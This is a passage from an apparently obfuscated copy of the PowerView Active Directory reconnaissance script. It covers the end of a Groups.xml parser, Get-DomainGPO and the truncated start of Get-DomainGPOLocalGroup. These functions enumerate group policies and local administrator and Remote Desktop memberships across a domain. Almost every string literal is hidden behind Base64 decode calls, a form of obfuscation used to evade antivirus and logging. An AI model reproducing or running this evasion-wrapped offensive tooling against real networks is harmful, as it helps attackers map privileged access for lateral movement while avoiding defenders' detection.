                        $GroupSID = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTQ0")))
                    }
                    elseif ($Groupname -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVtb3RlIERlc2t0b3A=")))) {
                        $GroupSID = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTU1")))
                    }
                    elseif ($Groupname -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3Vlc3Rz")))) {
                        $GroupSID = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTQ2")))
                    }
                    else {
                        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) {
                            $GroupSID = ConvertTo-SID -ObjectName $Groupname -Credential $Credential
                        }
                        else {
                            $GroupSID = ConvertTo-SID -ObjectName $Groupname
                        }
                    }
                }

                
                $Members = $_.Properties.members | Select-Object -ExpandProperty Member | Where-Object { $_.action -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QURE"))) } | ForEach-Object {
                    if ($_.sid) { $_.sid }
                    else { $_.name }
                }

                if ($Members) {
                    
                    if ($_.filters) {
                        $Filters = $_.filters.GetEnumerator() | ForEach-Object {
                            New-Object -TypeName PSObject -Property @{([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VHlwZQ=="))) = $_.LocalName;([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VmFsdWU="))) = $_.name}
                        }
                    }
                    else {
                        $Filters = $Null
                    }

                    if ($Members -isnot [System.Array]) { $Members = @($Members) }

                    $GroupsXML = New-Object PSObject
                    $GroupsXML | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R1BPUGF0aA=="))) $TargetGroupsXMLPath
                    $GroupsXML | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RmlsdGVycw=="))) $Filters
                    $GroupsXML | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3JvdXBOYW1l"))) $GroupName
                    $GroupsXML | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3JvdXBTSUQ="))) $GroupSID
                    $GroupsXML | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3JvdXBNZW1iZXJPZg=="))) $Null
                    $GroupsXML | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3JvdXBNZW1iZXJz"))) $Members
                    $GroupsXML.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3Lkdyb3Vwc1hNTA=="))))
                    $GroupsXML
                }
            }
        }
        catch {
            Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Hcm91cHNYTUxdIEVycm9yIHBhcnNpbmcgJFRhcmdldEdyb3Vwc1hNTFBhdGggOiB7MH0="))) -f $_)
        }
    }

    END {
        
        $MappedPaths.Keys | ForEach-Object { Remove-RemoteConnection -Path $_ }
    }
}


function Get-DomainGPO {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.GPO')]
    [OutputType('PowerView.GPO.Raw')]
    [CmdletBinding(DefaultParameterSetName = 'None')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $Identity,

        [Parameter(ParameterSetName = 'ComputerIdentity')]
        [Alias('ComputerName')]
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerIdentity,

        [Parameter(ParameterSetName = 'UserIdentity')]
        [Alias('UserName')]
        [ValidateNotNullOrEmpty()]
        [String]
        $UserIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3VidHJlZQ=="))),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Alias('ReturnOne')]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw==")))] = $Properties }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))] = $SearchBase }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))] = $SearchScope }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VjdXJpdHlNYXNrcw==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VjdXJpdHlNYXNrcw==")))] = $SecurityMasks }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))] = $Tombstone }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
        $GPOSearcher = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        if ($GPOSearcher) {
            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJJZGVudGl0eQ==")))] -or $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlcklkZW50aXR5")))]) {
                $GPOAdsPaths = @()
                if ($SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw==")))]) {
                    $OldProperties = $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw==")))]
                }
                $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw==")))] = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZGlzdGluZ3Vpc2hlZG5hbWUsZG5zaG9zdG5hbWU=")))
                $TargetComputerName = $Null

                if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJJZGVudGl0eQ==")))]) {
                    $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHk=")))] = $ComputerIdentity
                    $Computer = Get-DomainComputer @SearcherArguments -FindOne | Select-Object -First 1
                    if(-not $Computer) {
                        Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5HUE9dIENvbXB1dGVyICckQ29tcHV0ZXJJZGVudGl0eScgbm90IGZvdW5kIQ==")))
                    }
                    $ObjectDN = $Computer.distinguishedname
                    $TargetComputerName = $Computer.dnshostname
                }
                else {
                    $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHk=")))] = $UserIdentity
                    $User = Get-DomainUser @SearcherArguments -FindOne | Select-Object -First 1
                    if(-not $User) {
                        Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5HUE9dIFVzZXIgJyRVc2VySWRlbnRpdHknIG5vdCBmb3VuZCE=")))
                    }
                    $ObjectDN = $User.distinguishedname
                }

                
                $ObjectOUs = @()
                $ObjectOUs += $ObjectDN.split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LA==")))) | ForEach-Object {
                    if($_.startswith(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T1U9"))))) {
                        $ObjectDN.SubString($ObjectDN.IndexOf((([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ezB9LA=="))) -f $($_))))
                    }
                }
                Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5HUE9dIG9iamVjdCBPVXM6ICRPYmplY3RPVXM=")))

                if ($ObjectOUs) {
                    
                    $SearcherArguments.Remove(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw=="))))
                    $InheritanceDisabled = $False
                    ForEach($ObjectOU in $ObjectOUs) {
                        $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHk=")))] = $ObjectOU
                        $GPOAdsPaths += Get-DomainOU @SearcherArguments | ForEach-Object {
                            
                            if ($_.gplink) {
                                $_.gplink.split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XVs=")))) | ForEach-Object {
                                    if ($_.startswith(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUA=="))))) {
                                        $Parts = $_.split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Ow=="))))
                                        $GpoDN = $Parts[0]
                                        $Enforced = $Parts[1]

                                        if ($InheritanceDisabled) {
                                            
                                            
                                            if ($Enforced -eq 2) {
                                                $GpoDN
                                            }
                                        }
                                        else {
                                            
                                            $GpoDN
                                        }
                                    }
                                }
                            }

                            
                            if ($_.gpoptions -eq 1) {
                                $InheritanceDisabled = $True
                            }
                        }
                    }
                }

                if ($TargetComputerName) {
                    
                    $ComputerSite = (Get-NetComputerSiteName -ComputerName $TargetComputerName).SiteName
                    if($ComputerSite -and ($ComputerSite -notlike ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RXJyb3Iq"))))) {
                        $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHk=")))] = $ComputerSite
                        $GPOAdsPaths += Get-DomainSite @SearcherArguments | ForEach-Object {
                            if($_.gplink) {
                                
                                $_.gplink.split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XVs=")))) | ForEach-Object {
                                    if ($_.startswith(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUA=="))))) {
                                        $_.split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Ow=="))))[0]
                                    }
                                }
                            }
                        }
                    }
                }

                
                $ObjectDomainDN = $ObjectDN.SubString($ObjectDN.IndexOf(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9")))))
                $SearcherArguments.Remove(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHk="))))
                $SearcherArguments.Remove(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw=="))))
                $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg==")))] = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KG9iamVjdGNsYXNzPWRvbWFpbikoZGlzdGluZ3Vpc2hlZG5hbWU9JE9iamVjdERvbWFpbkROKQ==")))
                $GPOAdsPaths += Get-DomainObject @SearcherArguments | ForEach-Object {
                    if($_.gplink) {
                        
                        $_.gplink.split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XVs=")))) | ForEach-Object {
                            if ($_.startswith(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUA=="))))) {
                                $_.split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Ow=="))))[0]
                            }
                        }
                    }
                }
                Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5HUE9dIEdQT0Fkc1BhdGhzOiAkR1BPQWRzUGF0aHM=")))

                
                if ($OldProperties) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw==")))] = $OldProperties }
                else { $SearcherArguments.Remove(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw==")))) }
                $SearcherArguments.Remove(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHk="))))

                $GPOAdsPaths | Where-Object {$_ -and ($_ -ne '')} | ForEach-Object {
                    
                    $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))] = $_
                    $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg==")))] = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KG9iamVjdENhdGVnb3J5PWdyb3VwUG9saWN5Q29udGFpbmVyKQ==")))
                    Get-DomainObject @SearcherArguments | ForEach-Object {
                        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmF3")))]) {
                            $_.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LkdQTy5SYXc="))))
                        }
                        else {
                            $_.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LkdQTw=="))))
                        }
                        $_
                    }
                }
            }
            else {
                $IdentityFilter = ''
                $Filter = ''
                $Identity | Where-Object {$_} | ForEach-Object {
                    $IdentityInstance = $_.Replace(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KA=="))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XDI4")))).Replace(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KQ=="))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XDI5"))))
                    if ($IdentityInstance -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUDovL3xeQ049Lio=")))) {
                        $IdentityFilter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KGRpc3Rpbmd1aXNoZWRuYW1lPSRJZGVudGl0eUluc3RhbmNlKQ==")))
                        if ((-not $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) -and (-not $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))])) {
                            
                            
                            $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9"))))) -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9"))),'' -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lg==")))
                            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5HUE9dIEV4dHJhY3RlZCBkb21haW4gJyRJZGVudGl0eURvbWFpbicgZnJvbSAnJElkZW50aXR5SW5zdGFuY2U=")))
                            $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $IdentityDomain
                            $GPOSearcher = Get-DomainSearcher @SearcherArguments
                            if (-not $GPOSearcher) {
                                Write-Warning ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5HUE9dIFVuYWJsZSB0byByZXRyaWV2ZSBkb21haW4gc2VhcmNoZXIgZm9yICckSWRlbnRpdHlEb21haW4=")))
                            }
                        }
                    }
                    elseif ($IdentityInstance -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ey4qfQ==")))) {
                        $IdentityFilter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KG5hbWU9JElkZW50aXR5SW5zdGFuY2Up")))
                    }
                    else {
                        try {
                            $GuidByteString = (-Join (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object {$_.ToString(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("WA==")))).PadLeft(2,([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MA=="))))})) -Replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KC4uKQ=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XCQx")))
                            $IdentityFilter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KG9iamVjdGd1aWQ9JEd1aWRCeXRlU3RyaW5nKQ==")))
                        }
                        catch {
                            $IdentityFilter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KGRpc3BsYXluYW1lPSRJZGVudGl0eUluc3RhbmNlKQ==")))
                        }
                    }
                }
                if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                    $Filter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KHwkSWRlbnRpdHlGaWx0ZXIp")))
                }

                if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg==")))]) {
                    Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5HUE9dIFVzaW5nIGFkZGl0aW9uYWwgTERBUCBmaWx0ZXI6ICRMREFQRmlsdGVy")))
                    $Filter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JExEQVBGaWx0ZXI=")))
                }

                $GPOSearcher.filter = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KCYob2JqZWN0Q2F0ZWdvcnk9Z3JvdXBQb2xpY3lDb250YWluZXIpJEZpbHRlcik=")))
                Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5HUE9dIGZpbHRlciBzdHJpbmc6IHswfQ=="))) -f $($GPOSearcher.filter))

                if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RmluZE9uZQ==")))]) { $Results = $GPOSearcher.FindOne() }
                else { $Results = $GPOSearcher.FindAll() }
                $Results | Where-Object {$_} | ForEach-Object {
                    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmF3")))]) {
                        
                        $GPO = $_
                        $GPO.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LkdQTy5SYXc="))))
                    }
                    else {
                        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))] -and ($SearchBase -Match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XkdDOi8v"))))) {
                            $GPO = Convert-LDAPProperty -Properties $_.Properties
                            try {
                                $GPODN = $GPO.distinguishedname
                                $GPODomain = $GPODN.SubString($GPODN.IndexOf(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9"))))) -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9"))),'' -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lg==")))
                                $gpcfilesyspath = (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XFwkR1BPRG9tYWluXFN5c1ZvbFwkR1BPRG9tYWluXFBvbGljaWVzXHswfQ=="))) -f $($GPO.cn))
                                $GPO | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Z3BjZmlsZXN5c3BhdGg="))) $gpcfilesyspath
                            }
                            catch {
                                Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5HUE9dIEVycm9yIGNhbGN1bGF0aW5nIGdwY2ZpbGVzeXNwYXRoIGZvcjogezB9"))) -f $($GPO.distinguishedname))
                            }
                        }
                        else {
                            $GPO = Convert-LDAPProperty -Properties $_.Properties
                        }
                        $GPO.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LkdQTw=="))))
                    }
                    $GPO
                }
                if ($Results) {
                    try { $Results.dispose() }
                    catch {
                        Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5HUE9dIEVycm9yIGRpc3Bvc2luZyBvZiB0aGUgUmVzdWx0cyBvYmplY3Q6IHswfQ=="))) -f $_)
                    }
                }
                $GPOSearcher.dispose()
            }
        }
    }
}


function Get-DomainGPOLocalGroup {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.GPOGroup')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $Identity,

        [Switch]
        $ResolveMembersToSIDs,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3VidHJlZQ=="))),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg==")))] = $Domain }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))] = $SearchBase }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))] = $SearchScope }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))] = $Tombstone }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }

        $ConvertArguments = @{}
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) { $ConvertArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $ConvertArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $ConvertArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }

        $SplitOption = [System.StringSplitOptions]::RemoveEmptyEntries
    }

    PROCESS {
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHk=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHk=")))] = $Identity }

        Get-DomainGPO @SearcherArguments | ForEach-Object {
            $GPOdisplayName = $_.displayname
            $GPOname = $_.name
            $GPOPath = $_.gpcfilesyspath

            $ParseArgs =  @{ ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3B0VG1wbFBhdGg="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JEdQT1BhdGhcTUFDSElORVxNaWNyb3NvZnRcV2luZG93cyBOVFxTZWNFZGl0XEdwdFRtcGwuaW5m"))) }
            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $ParseArgs[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }

            
            $Inf = Get-GptTmpl @ParseArgs

            if ($Inf -and ($Inf.psbase.Keys -contains ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3JvdXAgTWVtYmVyc2hpcA=="))))) {
                $Memberships = @{}

                
                ForEach ($Membership in $Inf.([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3JvdXAgTWVtYmVyc2hpcA=="))).GetEnumerator()) {
                    $Group, $Relation = $Membership.Key.Split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("X18="))), $SplitOption) | ForEach-Object {$_.Trim()}
                    
